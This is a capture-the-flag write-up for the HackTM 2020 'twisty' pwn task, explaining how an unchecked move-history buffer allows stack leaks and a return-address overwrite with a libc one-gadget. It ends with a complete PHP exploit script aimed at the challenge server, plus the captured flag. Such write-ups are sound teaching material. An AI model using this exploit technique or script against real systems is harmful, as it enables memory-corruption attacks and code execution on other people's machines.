# twisty - HackTM 2020 Quals
## Introduction

twisty is a pwn task.

It is a C implementation of the puzzle from the `shifty` task. This
implementation has a different notation for moves, and keeps track of the
player's history. The player can undo their moves.


## Vulnerability

The vulnerability is straightforward: the history lays on the stack, but there
is no bound check on it.

A player can underflow the history buffer by sending undo requests. This will
result in them overwriting the board of the game.

A player can overflow the history buffer by sending 4096 moves. This will
overwrite the number of move in the history.

The stack is arranged like this:
```
uint8_t  board[0x10];
uint8_t  history[2048];
uint32_t index;
```

Every move is coded on a nibble (4 bits) according to the following look-up
table:
```
c0u: 0x00
c1u: 0x01
c2u: 0x02
c3u: 0x03
c0d: 0x04
c1d: 0x05
c2d: 0x06
c3d: 0x07
r0r: 0x08
r1r: 0x09
r2r: 0x0a
r3r: 0x0b
r0l: 0x0c
r1l: 0x0d
r2l: 0x0e
r3l: 0x0f
```


## Leak

By overwriting the `index` variable, and showing a list of moves, it is possible
to leak variables on the stack. This works by making the program think there are
more moves in the history than the current amount.

Among the variables are:
* The canary (offset 0x10)
* The entry point (offset 0x30)
* The return address of `__libc_start_main` (offset 0x50)

Only the libc address is required to exploit this binary.

The leak is achieved by filling the history with 4096 moves, and partially
overwriting the `index` variable to `0x000010b0` (`r3r`)


## Exploitation

Exploitation is similar to the leak, except that the return address of `main` is
rewritten after being read.

This can be done by "rewinding" the pointer right before the address with undo,
and sending carefully selected move to change the return address to a value
controlled by the attacker.

The one-gadget at `libc + 0x0004526a` has been selected for this task. It
requires `[rsp + 0x30]` to be NULL. This can be achieved by sending enough `c0u`
moves to zero out the next values on the stack.

The return address is called when the puzzle is fully solved. Solving the
puzzle is out of the scope of this writeup. The method to solve it is explained
in a different writeup.

**Flag**: `HackTM{0h_boY_thi$_5P!nniNG's_gonn@_m4k3_Me_D!zzY}`


## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/home/user/ctf/tools/pwn/phplib/hexdump.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/home/user/ctf/tools/pwn/phplib/tubes/Socket.php";

const HOST = "138.68.67.161";
const PORT = 20007;

function cube(Tube $t)
{
	$cube = "";
	for($i = 0; $i < 4; $i++)
		$cube .= $t->readLine();
	$t->expect("> ");

	return $cube;
}

function leak(Tube $t)
{
	static $LUT = [
		"c0u" => 0x00, "c1u" => 0x01, "c2u" => 0x02, "c3u" => 0x03,
		"c0d" => 0x04, "c1d" => 0x05, "c2d" => 0x06, "c3d" => 0x07,
		"r0r" => 0x08, "r1r" => 0x09, "r2r" => 0x0a, "r3r" => 0x0b,
		"r0l" => 0x0c, "r1l" => 0x0d, "r2l" => 0x0e, "r3l" => 0x0f,
	];

	cube($t);
	$t->write("l");

	$line = trim($t->readLine());
	$leak = explode(" ", $line);
	$leak = array_slice($leak, 4096);

	/* Apply the LUT */
	$ret = $leak;
	for($i = 0; $i < sizeof($ret); $i++)
		$ret[$i] = $LUT[$ret[$i]];

	return $ret;
}

function leak2str($leak)
{
	$ret = "";
	for($i = 0; $i < sizeof($leak); $i += 2) {
		$low  = $leak[$i + 1] ?? 0;
		$high = $leak[$i]     ?? 0;

		$ret .= chr(($high << 4) | $low);
	}

	return $ret;
}

function str2move($str)
{
	static $LUT = [
		"c0u", "c1u", "c2u", "c3u",
		"c0d", "c1d", "c2d", "c3d",
		"r0r", "r1r", "r2r", "r3r",
		"r0l", "r1l", "r2l", "r3l",
	];

	$ret = [];
	for($i = 0; $i < strlen($str); $i++) {
		$byte  = ord($str[$i]);
		$ret[] = $LUT[$byte >> 4];
		$ret[] = $LUT[$byte & 0x0F];
	}

	return $ret;
}

printf("[*] Creating process\n");
$time = microtime(true);
$t = new Socket(HOST, PORT);

$t->expectLine("Welcome to my game!");
$t->expectLine("Your job is to get the \"rubik's square\" to this configuration:");
$t->expectLine("");
$t->expectLine("ABCD");
$t->expectLine("EFGH");
$t->expectLine("IJKL");
$t->expectLine("MNOP");
$t->expectLine("");
$t->expectLine("Good luck!");
$t->expectLine("");
$t->expectLine("");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

printf("[*] Fill history buffer\n");
cube($t);
$t->write(str_repeat("r0r", 4096)); // 8888888

for($i = 0; $i < 4096 - 1; $i++)
	cube($t);

// 00001000
printf("[*] Leak data\n");
cube($t); $t->write("r3r"); // 0x000010b0 + 1

$leak   = leak2str(leak($t));
printf("%s\n", hexdump($leak));

$canary = substr($leak, 0x10, 8);
$base   = unpack("Q", substr($leak, 0x30, 8))[1] - 0xc00;
$libc   = unpack("Q", substr($leak, 0x50, 8))[1] - 0x20830;

printf("[+] Canary: %s\n", bin2hex($canary));
printf("[+] Base: 0x%016X\n", $base);
printf("[+] libc: 0x%016X\n", $libc);

printf("[*] Overwrite return\n");
for($i = 0; $i < 0x11; $i++) {
	cube($t);
	$t->write("u");
}

$one_gadget = $libc + 0x0004526a; // rsp + 0x30 == 0
$t->write(implode("", str2move(pack("Q", $one_gadget))));
for($i = 0; $i < 16; $i++)
	cube($t);

printf("[*] Grooming stack\n");
$t->write(implode("", str2move(str_repeat("\x00", 0x38))));
for($i = 0; $i < 2 * 0x38; $i++)
	cube($t);

solve:
printf("[*] Solving challenge\n");
$cube = cube($t);

$code = "[";
for($i = 0; $i < 16; $i++) {
	if($i % 4 === 0)
		$code .= "[";

	$code .= sprintf("%d, ", ord($cube[$i]) - 0x41);

	if($i % 4 === 3)
		$code .= "],";
}
$code .= "]";

$cmd = sprintf("echo %s | python2 ./solve.py", escapeshellarg($code));
$ret = shell_exec($cmd);
$t->write($ret);

$t->pipe();
```